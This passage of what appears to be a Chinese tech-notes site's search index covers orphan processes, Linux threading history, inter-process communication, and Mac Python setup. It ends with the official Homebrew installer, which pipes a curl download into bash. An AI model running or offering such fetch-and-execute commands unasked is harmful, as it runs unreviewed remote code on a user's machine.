\u5728\u6267\u884c\u4e0a\u9762\u8fd9\u6bb5\u4ee3\u7801\u7684\u65f6\u5019\uff0c\u4f1a\u6709\u4e24\u4e2a\u72ec\u7acb\u7684\u8fd0\u884c\u7a7a\u95f4\u72ec\u7acb\u7684\u4ee3\u7801\u6765\u6267\u884c\uff0c\u5728\u7236\u8fdb\u7a0b\u4e2d\u6267\u884c\u7684\u65f6\u5019\uff0c\u7531\u4e8e\u8fd4\u56de\u7684\u662f\u5b50\u8fdb\u7a0b\u7684pid\uff0c\u6240\u4ee5\u4e0d\u4f1a\u7b49\u4e8e0\uff0c\u5c31\u8d70else\u3002\u5728\u5b50\u8fdb\u7a0b\u7684\u72ec\u7acb\u7684\u8fd0\u884c\u7a7a\u95f4\u6267\u884c\u4e0a\u9762\u7684\u90a3\u4efd\u4ee3\u7801\uff0c\u56e0\u4e3afork\u7ed9\u5b50\u8fdb\u7a0b\u8fd4\u56de\u7684\u662f0\uff0c\u6240\u4ee5\u5c31\u8d70if\u90a3\u6761\u3002 \u8ba9\u7236\u8fdb\u7a0b\u5148\u6267\u884c\u5b8c\uff0c\u540e\u6267\u884c\u7684\u5b50\u8fdb\u7a0b\uff0c\u8fd9\u5c31\u610f\u5473\u7740\uff0c\u5b50\u8fdb\u7a0b\u6267\u884c\u5b8c\u4e86\u7684\u65f6\u5019\uff0c\u7236\u8fdb\u7a0b\u5df2\u7ecf\u4e0d\u5728\u4e86\uff0c\u5c31\u6210\u4e86\u5b64\u513f\u8fdb\u7a0b\uff0c\u5b64\u513f\u8fdb\u7a0b\u6700\u7ec8\u4f1a\u7531init\uff0c\u4e5f\u5c31\u662f\u8fdb\u7a0b1\u6536\u517b\uff0c\u628a\u5b83\u6740\u6389 #\u9700\u8981\u591a\u6267\u884c\u51e0\u6b21\uff0c\u5c31\u4f1a\u51fa\u73b0\u4e0b\u9762\u7684\u60c5\u51b5 $ python zone.py getpid=3675,getppid=1861\uff0c\u8be5\u8def\u5f84\u4e3a\u7236\u8fdb\u7a0b\uff0c\u4ea7\u751f\u7684\u5b50\u8fdb\u7a0bID\u4e3a3676 getpid=3676,getppid=1,\u8be5\u8def\u5f84\u4e3a\u5b50\u8fdb\u7a0b\uff0c\u4ea7\u751f\u7684\u5b50\u8fdb\u7a0bID\u4e3a0 #ppid\u5df2\u7ecf\u4e3a1\uff0c\u88ab\u8fdb\u7a0b1\u6536\u517b","title":"Python\u6a21\u62df\u5b64\u513f\u8fdb\u7a0b\u4ea7\u751f"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/%E7%BA%BF%E7%A8%8B%E7%9A%84%E7%A0%94%E7%A9%B6/","text":"\u7ebf\u7a0b \u7f51\u4e0a\u67e5\u627e\u7ebf\u7a0b\u7684\u8d44\u6599\uff0c\u5f88\u591a\u90fd\u662f\u8bb2\u7684\u6982\u5ff5\uff0c\u5e76\u4e0d\u8bb2\u5b9e\u9645\u6848\u4f8b\uff0c\u800c\u7ebf\u7a0b\u4e5f\u662f\u5206\u5f88\u591a\u5b9e\u73b0\u65b9\u6cd5\u7684\uff0c\u5bf9\u4e8e\u7ebf\u7a0b\u5404\u79cd\u72b6\u6001\uff0c\u4e5f\u662f\u4e0d\u540c\u5b9e\u73b0\u65b9\u6cd5\u5b9e\u73b0\u7684\u7ebf\u7a0b\u5b58\u5728\u5dee\u5f02 \u6211\u5e73\u65f6\u63a5\u89e6\u6700\u591a\u7684\u5c31\u662fLinux\uff0c\u8fd9\u91cc\u53ea\u9488\u5bf9centos\u7684Linux\u7ebf\u7a0b\u505a\u9610\u8ff0 \u7ebf\u7a0b\u662f\u4ec0\u4e48 \u7ef4\u57fa\u767e\u79d1\u4e0a\u7684\u57fa\u672c\u6982\u5ff5\uff1ahttps://zh.wikipedia.org/wiki/%E7%BA%BF%E7%A8%8B \u7ebf\u7a0b\u7684\u6807\u51c6\u662f POSIX\u7ebf\u7a0b\uff08POSIX threads\uff09\uff0c\u7b80\u79f0Pthreads\uff0c \u662f\u7ebf\u7a0b\u7684POSIX\u6807\u51c6\u3002\u8be5\u6807\u51c6\u5b9a\u4e49\u4e86\u521b\u5efa\u548c\u64cd\u7eb5\u7ebf\u7a0b\u7684\u4e00\u6574\u5957API\u3002\u5728\u7c7bUnix\u64cd\u4f5c\u7cfb\u7edf\uff08Unix\u3001Linux\u3001Mac OS X\u7b49\uff09\u4e2d\uff0c\u90fd\u4f7f\u7528Pthreads\u4f5c\u4e3a\u64cd\u4f5c\u7cfb\u7edf\u7684\u7ebf\u7a0b \u5386\u53f2 \u4e00\u5f00\u59cbLinux\u7684\u591a\u7ebf\u7a0b\u662f LinuxThreads \u8fd9\u4e2a\u5de5\u7a0b\u5e26\u5165\u5230 Linux \u7684\uff0c\u4f46\u662f\u4e0d\u7b26\u5408POSIX threads\uff0c\u540e\u6765\u51fa\u73b0\u4e86 NPTL\uff0c\u4ee3\u66ff LinuxThreads\u3002\u4e00\u76f4\u4ee5\u6765, linux\u5185\u6838\u5e76\u6ca1\u6709\u7ebf\u7a0b\u7684\u6982\u5ff5. \u6bcf\u4e00\u4e2a\u6267\u884c\u5b9e\u4f53\u90fd\u662f\u4e00\u4e2atask_struct\u7ed3\u6784, \u901a\u5e38\u79f0\u4e4b\u4e3a\u8fdb\u7a0b. \u4e5f\u5c31\u662fLWP\uff0cLinux\u5185\u6838\u5728 2.0.x\u7248\u672c\u5c31\u5df2\u7ecf\u5b9e\u73b0\u4e86\u8f7b\u91cf\u8fdb\u7a0b\uff0c\u5e94\u7528\u7a0b\u5e8f\u53ef\u4ee5\u901a\u8fc7\u4e00\u4e2a\u7edf\u4e00\u7684clone()\u7cfb\u7edf\u8c03\u7528\u63a5\u53e3\uff0c\u7528\u4e0d\u540c\u7684\u53c2\u6570\u6307\u5b9a\u521b\u5efa\u8f7b\u91cf\u8fdb\u7a0b\u8fd8\u662f\u666e\u901a\u8fdb\u7a0b\u3002\u5728\u5185\u6838\u4e2d\uff0c clone()\u8c03\u7528\u7ecf\u8fc7\u53c2\u6570\u4f20\u9012\u548c\u89e3\u91ca\u540e\u4f1a\u8c03\u7528do_fork()\uff0c\u8fd9\u4e2a\u6838\u5185\u51fd\u6570\u540c\u65f6\u4e5f\u662ffork()\u3001vfork()\u7cfb\u7edf\u8c03\u7528\u7684\u6700\u7ec8\u5b9e\u73b0\u3002\u540e\u6765\u4e3a\u4e86\u5f15\u5165\u591a\u7ebf\u7a0b\uff0cLinux2.0~2.4\u5b9e\u73b0\u7684\u662f\u4fd7\u79f0LinuxThreads\u7684\u591a\u7ebf\u7a0b\u65b9\u5f0f\uff0c\u5230\u4e862.6\uff0c\u57fa\u672c\u4e0a\u90fd\u662fNPTL\u7684\u65b9\u5f0f\u4e86 LinuxThreads : https://en.wikipedia.org/wiki/LinuxThreads NPTL : https://en.wikipedia.org/wiki/Native_POSIX_Thread_Library \u67e5\u770b \u5728\u73b0\u4ee3\u7684\u65e2\u6709 NPTL \u53c8\u6709 LinuxThreads \u7684 Linux \u53d1\u884c\u7248\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u4e0b\u9762\u7684\u547d\u4ee4\u6765\u67e5\u770b\u5f53\u524d\u4f7f\u7528\u7684\u662f\u54ea\u4e2a\u7ebf\u7a0b\u5e93\uff1a $ getconf GNU_LIBPTHREAD_VERSION \u8f93\u51fa\u7684\u7ed3\u679c\u5982\u4e0b\uff1a NPTL 0.34 \u6216\u8005\uff1a linuxthreads-0.10 \u76f8\u5173\u8d44\u6599\u94fe\u63a5\uff1a \u94fe\u63a5\uff1ahttps://blog.csdn.net/kwinway/article/details/80550937 \u94fe\u63a5\uff1ahttps://www.jianshu.com/p/6c507b966ad1","title":"\u4ec0\u4e48\u662f\u7ebf\u7a0b"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/%E7%BA%BF%E7%A8%8B%E7%9A%84%E7%A0%94%E7%A9%B6/#_1","text":"\u7f51\u4e0a\u67e5\u627e\u7ebf\u7a0b\u7684\u8d44\u6599\uff0c\u5f88\u591a\u90fd\u662f\u8bb2\u7684\u6982\u5ff5\uff0c\u5e76\u4e0d\u8bb2\u5b9e\u9645\u6848\u4f8b\uff0c\u800c\u7ebf\u7a0b\u4e5f\u662f\u5206\u5f88\u591a\u5b9e\u73b0\u65b9\u6cd5\u7684\uff0c\u5bf9\u4e8e\u7ebf\u7a0b\u5404\u79cd\u72b6\u6001\uff0c\u4e5f\u662f\u4e0d\u540c\u5b9e\u73b0\u65b9\u6cd5\u5b9e\u73b0\u7684\u7ebf\u7a0b\u5b58\u5728\u5dee\u5f02 \u6211\u5e73\u65f6\u63a5\u89e6\u6700\u591a\u7684\u5c31\u662fLinux\uff0c\u8fd9\u91cc\u53ea\u9488\u5bf9centos\u7684Linux\u7ebf\u7a0b\u505a\u9610\u8ff0","title":"\u7ebf\u7a0b"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/%E7%BA%BF%E7%A8%8B%E7%9A%84%E7%A0%94%E7%A9%B6/#_2","text":"\u7ef4\u57fa\u767e\u79d1\u4e0a\u7684\u57fa\u672c\u6982\u5ff5\uff1ahttps://zh.wikipedia.org/wiki/%E7%BA%BF%E7%A8%8B \u7ebf\u7a0b\u7684\u6807\u51c6\u662f POSIX\u7ebf\u7a0b\uff08POSIX threads\uff09\uff0c\u7b80\u79f0Pthreads\uff0c \u662f\u7ebf\u7a0b\u7684POSIX\u6807\u51c6\u3002\u8be5\u6807\u51c6\u5b9a\u4e49\u4e86\u521b\u5efa\u548c\u64cd\u7eb5\u7ebf\u7a0b\u7684\u4e00\u6574\u5957API\u3002\u5728\u7c7bUnix\u64cd\u4f5c\u7cfb\u7edf\uff08Unix\u3001Linux\u3001Mac OS X\u7b49\uff09\u4e2d\uff0c\u90fd\u4f7f\u7528Pthreads\u4f5c\u4e3a\u64cd\u4f5c\u7cfb\u7edf\u7684\u7ebf\u7a0b","title":"\u7ebf\u7a0b\u662f\u4ec0\u4e48"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/%E7%BA%BF%E7%A8%8B%E7%9A%84%E7%A0%94%E7%A9%B6/#_3","text":"\u4e00\u5f00\u59cbLinux\u7684\u591a\u7ebf\u7a0b\u662f LinuxThreads \u8fd9\u4e2a\u5de5\u7a0b\u5e26\u5165\u5230 Linux \u7684\uff0c\u4f46\u662f\u4e0d\u7b26\u5408POSIX threads\uff0c\u540e\u6765\u51fa\u73b0\u4e86 NPTL\uff0c\u4ee3\u66ff LinuxThreads\u3002\u4e00\u76f4\u4ee5\u6765, linux\u5185\u6838\u5e76\u6ca1\u6709\u7ebf\u7a0b\u7684\u6982\u5ff5. \u6bcf\u4e00\u4e2a\u6267\u884c\u5b9e\u4f53\u90fd\u662f\u4e00\u4e2atask_struct\u7ed3\u6784, \u901a\u5e38\u79f0\u4e4b\u4e3a\u8fdb\u7a0b. \u4e5f\u5c31\u662fLWP\uff0cLinux\u5185\u6838\u5728 2.0.x\u7248\u672c\u5c31\u5df2\u7ecf\u5b9e\u73b0\u4e86\u8f7b\u91cf\u8fdb\u7a0b\uff0c\u5e94\u7528\u7a0b\u5e8f\u53ef\u4ee5\u901a\u8fc7\u4e00\u4e2a\u7edf\u4e00\u7684clone()\u7cfb\u7edf\u8c03\u7528\u63a5\u53e3\uff0c\u7528\u4e0d\u540c\u7684\u53c2\u6570\u6307\u5b9a\u521b\u5efa\u8f7b\u91cf\u8fdb\u7a0b\u8fd8\u662f\u666e\u901a\u8fdb\u7a0b\u3002\u5728\u5185\u6838\u4e2d\uff0c clone()\u8c03\u7528\u7ecf\u8fc7\u53c2\u6570\u4f20\u9012\u548c\u89e3\u91ca\u540e\u4f1a\u8c03\u7528do_fork()\uff0c\u8fd9\u4e2a\u6838\u5185\u51fd\u6570\u540c\u65f6\u4e5f\u662ffork()\u3001vfork()\u7cfb\u7edf\u8c03\u7528\u7684\u6700\u7ec8\u5b9e\u73b0\u3002\u540e\u6765\u4e3a\u4e86\u5f15\u5165\u591a\u7ebf\u7a0b\uff0cLinux2.0~2.4\u5b9e\u73b0\u7684\u662f\u4fd7\u79f0LinuxThreads\u7684\u591a\u7ebf\u7a0b\u65b9\u5f0f\uff0c\u5230\u4e862.6\uff0c\u57fa\u672c\u4e0a\u90fd\u662fNPTL\u7684\u65b9\u5f0f\u4e86 LinuxThreads : https://en.wikipedia.org/wiki/LinuxThreads NPTL : https://en.wikipedia.org/wiki/Native_POSIX_Thread_Library","title":"\u5386\u53f2"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/%E7%BA%BF%E7%A8%8B%E7%9A%84%E7%A0%94%E7%A9%B6/#_4","text":"\u5728\u73b0\u4ee3\u7684\u65e2\u6709 NPTL \u53c8\u6709 LinuxThreads \u7684 Linux \u53d1\u884c\u7248\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u4e0b\u9762\u7684\u547d\u4ee4\u6765\u67e5\u770b\u5f53\u524d\u4f7f\u7528\u7684\u662f\u54ea\u4e2a\u7ebf\u7a0b\u5e93\uff1a $ getconf GNU_LIBPTHREAD_VERSION \u8f93\u51fa\u7684\u7ed3\u679c\u5982\u4e0b\uff1a NPTL 0.34 \u6216\u8005\uff1a linuxthreads-0.10 \u76f8\u5173\u8d44\u6599\u94fe\u63a5\uff1a \u94fe\u63a5\uff1ahttps://blog.csdn.net/kwinway/article/details/80550937 \u94fe\u63a5\uff1ahttps://www.jianshu.com/p/6c507b966ad1","title":"\u67e5\u770b"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/%E8%BF%9B%E7%A8%8B%E9%97%B4%E9%80%9A%E4%BF%A1/","text":"\u8fdb\u7a0b\u95f4\u901a\u4fe1 \u7ba1\u9053\uff08pipe\uff09\u53ca\u547d\u540d\u7ba1\u9053\uff08named pipe\uff09 \u7ba1\u9053\u53ef\u7528\u4e8e\u5177\u6709\u4eb2\u7f18\u5173\u7cfb\u7684\u7236\u5b50\u8fdb\u7a0b\u95f4\u7684\u901a\u4fe1\uff0c\u6709\u540d\u7ba1\u9053\u9664\u4e86\u5177\u6709\u7ba1\u9053\u6240\u5177\u6709\u7684\u529f\u80fd\u5916\uff0c\u5b83\u8fd8\u5141\u8bb8\u65e0\u4eb2\u7f18\u5173\u7cfb\u8fdb\u7a0b\u95f4\u7684\u901a\u4fe1\uff1b \u4fe1\u53f7\uff08signal\uff09\uff1a \u4fe1\u53f7\u662f\u4e00\u79cd\u6bd4\u8f83\u590d\u6742\u7684\u901a\u4fe1\u65b9\u5f0f\uff0c\u7528\u4e8e\u901a\u77e5\u63a5\u6536\u8fdb\u7a0b\u67d0\u4e2a\u4e8b\u4ef6\u5df2\u7ecf\u53d1\u751f\uff1b \u6d88\u606f\u961f\u5217\uff1a \u6d88\u606f\u961f\u5217\u662f\u6d88\u606f\u7684\u94fe\u63a5\u8868\uff0c\u5b83\u514b\u670d\u4e86\u4e0a\u4e24\u79cd\u901a\u4fe1\u65b9\u5f0f\u4e2d\u4fe1\u53f7\u91cf\u6709\u9650\u7684\u7f3a\u70b9\uff0c\u5177\u6709\u5199\u6743\u9650\u5f97\u8fdb\u7a0b\u53ef\u4ee5\u6309\u7167\u4e00\u5b9a\u5f97\u89c4\u5219\u5411\u6d88\u606f\u961f\u5217\u4e2d\u6dfb\u52a0\u65b0\u4fe1\u606f\uff1b\u5bf9\u6d88\u606f\u961f\u5217\u6709\u8bfb\u6743\u9650\u5f97\u8fdb\u7a0b\u5219\u53ef\u4ee5\u4ece\u6d88\u606f\u961f\u5217\u4e2d\u8bfb\u53d6\u4fe1\u606f\uff1b \u5171\u4eab\u5185\u5b58\uff1a \u53ef\u4ee5\u8bf4\u8fd9\u662f\u6700\u6709\u7528\u7684\u8fdb\u7a0b\u95f4\u901a\u4fe1\u65b9\u5f0f\u3002\u5b83\u4f7f\u5f97\u591a\u4e2a\u8fdb\u7a0b\u53ef\u4ee5\u8bbf\u95ee\u540c\u4e00\u5757\u5185\u5b58\u7a7a\u95f4\uff0c\u4e0d\u540c\u8fdb\u7a0b\u53ef\u4ee5\u53ca\u65f6\u770b\u5230\u5bf9\u65b9\u8fdb\u7a0b\u4e2d\u5bf9\u5171\u4eab\u5185\u5b58\u4e2d\u6570\u636e\u5f97\u66f4\u65b0\u3002\u8fd9\u79cd\u65b9\u5f0f\u9700\u8981\u4f9d\u9760\u67d0\u79cd\u540c\u6b65\u64cd\u4f5c\uff0c\u5982\u4e92\u65a5\u9501\u548c\u4fe1\u53f7\u91cf\u7b49\uff1b \u4fe1\u53f7\u91cf\uff1a \u4e3b\u8981\u4f5c\u4e3a\u8fdb\u7a0b\u4e4b\u95f4\u53ca\u540c\u4e00\u79cd\u8fdb\u7a0b\u7684\u4e0d\u540c\u7ebf\u7a0b\u4e4b\u95f4\u5f97\u540c\u6b65\u548c\u4e92\u65a5\u624b\u6bb5\uff1b \u5957\u63a5\u5b57\uff1a \u8fd9\u662f\u4e00\u79cd\u66f4\u4e3a\u4e00\u822c\u5f97\u8fdb\u7a0b\u95f4\u901a\u4fe1\u673a\u5236\uff0c\u5b83\u53ef\u7528\u4e8e\u7f51\u7edc\u4e2d\u4e0d\u540c\u673a\u5668\u4e4b\u95f4\u7684\u8fdb\u7a0b\u95f4\u901a\u4fe1\uff0c\u5e94\u7528\u975e\u5e38\u5e7f\u6cdb\u3002","title":"\u8fdb\u7a0b\u95f4\u901a\u4fe1"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/%E8%BF%9B%E7%A8%8B%E9%97%B4%E9%80%9A%E4%BF%A1/#_1","text":"","title":"\u8fdb\u7a0b\u95f4\u901a\u4fe1"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/%E8%BF%9B%E7%A8%8B%E9%97%B4%E9%80%9A%E4%BF%A1/#pipenamed-pipe","text":"\u7ba1\u9053\u53ef\u7528\u4e8e\u5177\u6709\u4eb2\u7f18\u5173\u7cfb\u7684\u7236\u5b50\u8fdb\u7a0b\u95f4\u7684\u901a\u4fe1\uff0c\u6709\u540d\u7ba1\u9053\u9664\u4e86\u5177\u6709\u7ba1\u9053\u6240\u5177\u6709\u7684\u529f\u80fd\u5916\uff0c\u5b83\u8fd8\u5141\u8bb8\u65e0\u4eb2\u7f18\u5173\u7cfb\u8fdb\u7a0b\u95f4\u7684\u901a\u4fe1\uff1b","title":"\u7ba1\u9053\uff08pipe\uff09\u53ca\u547d\u540d\u7ba1\u9053\uff08named pipe\uff09"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/%E8%BF%9B%E7%A8%8B%E9%97%B4%E9%80%9A%E4%BF%A1/#signal","text":"\u4fe1\u53f7\u662f\u4e00\u79cd\u6bd4\u8f83\u590d\u6742\u7684\u901a\u4fe1\u65b9\u5f0f\uff0c\u7528\u4e8e\u901a\u77e5\u63a5\u6536\u8fdb\u7a0b\u67d0\u4e2a\u4e8b\u4ef6\u5df2\u7ecf\u53d1\u751f\uff1b","title":"\u4fe1\u53f7\uff08signal\uff09\uff1a"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/%E8%BF%9B%E7%A8%8B%E9%97%B4%E9%80%9A%E4%BF%A1/#_2","text":"\u6d88\u606f\u961f\u5217\u662f\u6d88\u606f\u7684\u94fe\u63a5\u8868\uff0c\u5b83\u514b\u670d\u4e86\u4e0a\u4e24\u79cd\u901a\u4fe1\u65b9\u5f0f\u4e2d\u4fe1\u53f7\u91cf\u6709\u9650\u7684\u7f3a\u70b9\uff0c\u5177\u6709\u5199\u6743\u9650\u5f97\u8fdb\u7a0b\u53ef\u4ee5\u6309\u7167\u4e00\u5b9a\u5f97\u89c4\u5219\u5411\u6d88\u606f\u961f\u5217\u4e2d\u6dfb\u52a0\u65b0\u4fe1\u606f\uff1b\u5bf9\u6d88\u606f\u961f\u5217\u6709\u8bfb\u6743\u9650\u5f97\u8fdb\u7a0b\u5219\u53ef\u4ee5\u4ece\u6d88\u606f\u961f\u5217\u4e2d\u8bfb\u53d6\u4fe1\u606f\uff1b","title":"\u6d88\u606f\u961f\u5217\uff1a"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/%E8%BF%9B%E7%A8%8B%E9%97%B4%E9%80%9A%E4%BF%A1/#_3","text":"\u53ef\u4ee5\u8bf4\u8fd9\u662f\u6700\u6709\u7528\u7684\u8fdb\u7a0b\u95f4\u901a\u4fe1\u65b9\u5f0f\u3002\u5b83\u4f7f\u5f97\u591a\u4e2a\u8fdb\u7a0b\u53ef\u4ee5\u8bbf\u95ee\u540c\u4e00\u5757\u5185\u5b58\u7a7a\u95f4\uff0c\u4e0d\u540c\u8fdb\u7a0b\u53ef\u4ee5\u53ca\u65f6\u770b\u5230\u5bf9\u65b9\u8fdb\u7a0b\u4e2d\u5bf9\u5171\u4eab\u5185\u5b58\u4e2d\u6570\u636e\u5f97\u66f4\u65b0\u3002\u8fd9\u79cd\u65b9\u5f0f\u9700\u8981\u4f9d\u9760\u67d0\u79cd\u540c\u6b65\u64cd\u4f5c\uff0c\u5982\u4e92\u65a5\u9501\u548c\u4fe1\u53f7\u91cf\u7b49\uff1b","title":"\u5171\u4eab\u5185\u5b58\uff1a"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/%E8%BF%9B%E7%A8%8B%E9%97%B4%E9%80%9A%E4%BF%A1/#_4","text":"\u4e3b\u8981\u4f5c\u4e3a\u8fdb\u7a0b\u4e4b\u95f4\u53ca\u540c\u4e00\u79cd\u8fdb\u7a0b\u7684\u4e0d\u540c\u7ebf\u7a0b\u4e4b\u95f4\u5f97\u540c\u6b65\u548c\u4e92\u65a5\u624b\u6bb5\uff1b","title":"\u4fe1\u53f7\u91cf\uff1a"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/%E8%BF%9B%E7%A8%8B%E9%97%B4%E9%80%9A%E4%BF%A1/#_5","text":"\u8fd9\u662f\u4e00\u79cd\u66f4\u4e3a\u4e00\u822c\u5f97\u8fdb\u7a0b\u95f4\u901a\u4fe1\u673a\u5236\uff0c\u5b83\u53ef\u7528\u4e8e\u7f51\u7edc\u4e2d\u4e0d\u540c\u673a\u5668\u4e4b\u95f4\u7684\u8fdb\u7a0b\u95f4\u901a\u4fe1\uff0c\u5e94\u7528\u975e\u5e38\u5e7f\u6cdb\u3002","title":"\u5957\u63a5\u5b57\uff1a"},{"location":"system/mac/MAC%E5%AE%89%E8%A3%85Python/","text":"MAC\u5b89\u88c5Python \u76f4\u63a5\u4e0a\u5b98\u7f51\u4e0b\u8f7dMAC Python\u5b89\u88c5\u5305\uff0c\u4e0d\u63a8\u8350\u4f7f\u7528brew\u5b89\u88c5 https://www.python.org/downloads/macos/ \u6211\u5e73\u65f6\u7528\u7684\u662f3.8.2\u7248\u672c\u3002\u4e0b\u8f7d\u540e\u7684\u5b89\u88c5\u5305\uff0c\u53cc\u51fb\u6253\u5f00\uff0c\u4e0b\u4e00\u6b65\u4e0b\u4e00\u6b65 \u5c31\u5b89\u88c5\u597d\u4e86 M1,M2\u7248\u672c\u76f4\u63a5\u5c31\u9009\u62e9macOS 64-bit universal2 installer \u6216\u8005 macOS 64-bit installer \u591a\u7248\u672c\u5171\u5b58\u95ee\u9898\uff1a \u4e2a\u4eba\u7535\u8111\uff08Mac\uff09\u76f4\u63a5\u5b89\u88c5\u591a\u7248\u672c\u5373\u53ef\uff0c\u5c0f\u7248\u672c\u4e4b\u95f4\u662f\u4e92\u76f8\u8986\u76d6\u5b89\u88c5\uff0c\u6bd4\u59822.7.10\u548c2.7.18\uff0c\u8c01\u540e\u5b89\u88c5\u7684\u8c01\u5c31\u628a\u524d\u8005\u8986\u76d6\u3002 \u5927\u7248\u672c\u4e4b\u95f4\u53ef\u4ee5\u5171\u5b58\uff0c\u6bd4\u59823.8.2\u30012.7.18\uff0c2.6.3\u30013.9.1\u4e4b\u95f4\u5c31\u53ef\u4ee5\u5171\u5b58\u3002\u4e0d\u8fc7Python3\u7684\u547d\u4ee4\uff0c\u9ed8\u8ba4\u6307\u5411\u7684\u662f\u540e\u5b89\u88c5\u76843\u7248\u672c\u3002\u540c\u7406Python2\u547d\u4ee4\u4e5f\u662f\u9ed8\u8ba4\u6307\u5411\u540e\u5b89\u88c5\u76842\u7248\u672c\u3002 \u5b89\u88c5Pycharm\uff0c\u6dfb\u52a0Python\u89e3\u91ca\u5668\u65f6\uff0c\u53ef\u4ee5\u9009\u62e9Virtualenv\u73af\u5883\uff0c\u65b0\u5efa\u4e2a\u865a\u62df\u73af\u5883\uff0c\u57fa\u7840\u89e3\u91ca\u5668\u9009\u62e9\u81ea\u5df1\u5b89\u88c5\u7684\u7248\u672c\u3002\u4e00\u4e2a\u9879\u76ee\u4e00\u4e2a\u865a\u62df\u73af\u5883\u3002\u8fd9\u6837\u4e0d\u4f1a\u51b2\u7a81 \u5982\u679cPycharm \u57fa\u7840\u89e3\u91ca\u5668\u9009\u62e9\u4e0d\u4e86\uff0c\u57fa\u672c\u662f\u8bfb\u53d6\u672c\u5730\u53d8\u91cf\u95ee\u9898\uff0cMAC\u5efa\u8bae\u5378\u8f7d\u91cd\u88c5\uff0c\u76f4\u63a5\u5b89\u88c5\u5b98\u65b9\u7248\u672c\uff0c\u4e0d\u8981\u901a\u8fc7toolbox\u4e0b\u8f7dPycharm\u3002 MAC \u8dd1python\u4ee3\u7801\u63d0\u793a nodename nor servname provided \u7cfb\u7edfhosts \u6587\u4ef6\u4e2d\u8981\u6709 127.0.0.1 localhost \u63a8\u8350\u4e2a\u5207\u6362\u81ea\u5b9a\u4e49HOSTS\u7684\u5de5\u5177 SwitchHosts/README.zh_hans.md at master \u00b7 oldj/SwitchHosts \u00b7 GitHub \u7136\u540e\u6e05\u9664dns\u8bbe\u7f6e dscacheutil -flushcache","title":"MAC\u5b89\u88c5Python"},{"location":"system/mac/MAC%E5%AE%89%E8%A3%85Python/#macpython","text":"\u76f4\u63a5\u4e0a\u5b98\u7f51\u4e0b\u8f7dMAC Python\u5b89\u88c5\u5305\uff0c\u4e0d\u63a8\u8350\u4f7f\u7528brew\u5b89\u88c5 https://www.python.org/downloads/macos/ \u6211\u5e73\u65f6\u7528\u7684\u662f3.8.2\u7248\u672c\u3002\u4e0b\u8f7d\u540e\u7684\u5b89\u88c5\u5305\uff0c\u53cc\u51fb\u6253\u5f00\uff0c\u4e0b\u4e00\u6b65\u4e0b\u4e00\u6b65 \u5c31\u5b89\u88c5\u597d\u4e86 M1,M2\u7248\u672c\u76f4\u63a5\u5c31\u9009\u62e9macOS 64-bit universal2 installer \u6216\u8005 macOS 64-bit installer","title":"MAC\u5b89\u88c5Python"},{"location":"system/mac/MAC%E5%AE%89%E8%A3%85Python/#_1","text":"\u4e2a\u4eba\u7535\u8111\uff08Mac\uff09\u76f4\u63a5\u5b89\u88c5\u591a\u7248\u672c\u5373\u53ef\uff0c\u5c0f\u7248\u672c\u4e4b\u95f4\u662f\u4e92\u76f8\u8986\u76d6\u5b89\u88c5\uff0c\u6bd4\u59822.7.10\u548c2.7.18\uff0c\u8c01\u540e\u5b89\u88c5\u7684\u8c01\u5c31\u628a\u524d\u8005\u8986\u76d6\u3002 \u5927\u7248\u672c\u4e4b\u95f4\u53ef\u4ee5\u5171\u5b58\uff0c\u6bd4\u59823.8.2\u30012.7.18\uff0c2.6.3\u30013.9.1\u4e4b\u95f4\u5c31\u53ef\u4ee5\u5171\u5b58\u3002\u4e0d\u8fc7Python3\u7684\u547d\u4ee4\uff0c\u9ed8\u8ba4\u6307\u5411\u7684\u662f\u540e\u5b89\u88c5\u76843\u7248\u672c\u3002\u540c\u7406Python2\u547d\u4ee4\u4e5f\u662f\u9ed8\u8ba4\u6307\u5411\u540e\u5b89\u88c5\u76842\u7248\u672c\u3002 \u5b89\u88c5Pycharm\uff0c\u6dfb\u52a0Python\u89e3\u91ca\u5668\u65f6\uff0c\u53ef\u4ee5\u9009\u62e9Virtualenv\u73af\u5883\uff0c\u65b0\u5efa\u4e2a\u865a\u62df\u73af\u5883\uff0c\u57fa\u7840\u89e3\u91ca\u5668\u9009\u62e9\u81ea\u5df1\u5b89\u88c5\u7684\u7248\u672c\u3002\u4e00\u4e2a\u9879\u76ee\u4e00\u4e2a\u865a\u62df\u73af\u5883\u3002\u8fd9\u6837\u4e0d\u4f1a\u51b2\u7a81 \u5982\u679cPycharm \u57fa\u7840\u89e3\u91ca\u5668\u9009\u62e9\u4e0d\u4e86\uff0c\u57fa\u672c\u662f\u8bfb\u53d6\u672c\u5730\u53d8\u91cf\u95ee\u9898\uff0cMAC\u5efa\u8bae\u5378\u8f7d\u91cd\u88c5\uff0c\u76f4\u63a5\u5b89\u88c5\u5b98\u65b9\u7248\u672c\uff0c\u4e0d\u8981\u901a\u8fc7toolbox\u4e0b\u8f7dPycharm\u3002 MAC \u8dd1python\u4ee3\u7801\u63d0\u793a nodename nor servname provided \u7cfb\u7edfhosts \u6587\u4ef6\u4e2d\u8981\u6709 127.0.0.1 localhost \u63a8\u8350\u4e2a\u5207\u6362\u81ea\u5b9a\u4e49HOSTS\u7684\u5de5\u5177 SwitchHosts/README.zh_hans.md at master \u00b7 oldj/SwitchHosts \u00b7 GitHub \u7136\u540e\u6e05\u9664dns\u8bbe\u7f6e dscacheutil -flushcache","title":"\u591a\u7248\u672c\u5171\u5b58\u95ee\u9898\uff1a"},{"location":"system/mac/%E5%AE%89%E8%A3%85Homebrew/","text":"\u5b89\u88c5Homebrew % export http_proxy=http://127.0.0.1:1087;export https_proxy=http://127.0.0.1:1087;export ALL_PROXY=socks5://127.0.0.1:1080 #\u8bbe\u7f6e\u7ec8\u7aef\u4ee3\u7406 % /bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\" #\u5b89\u88c5 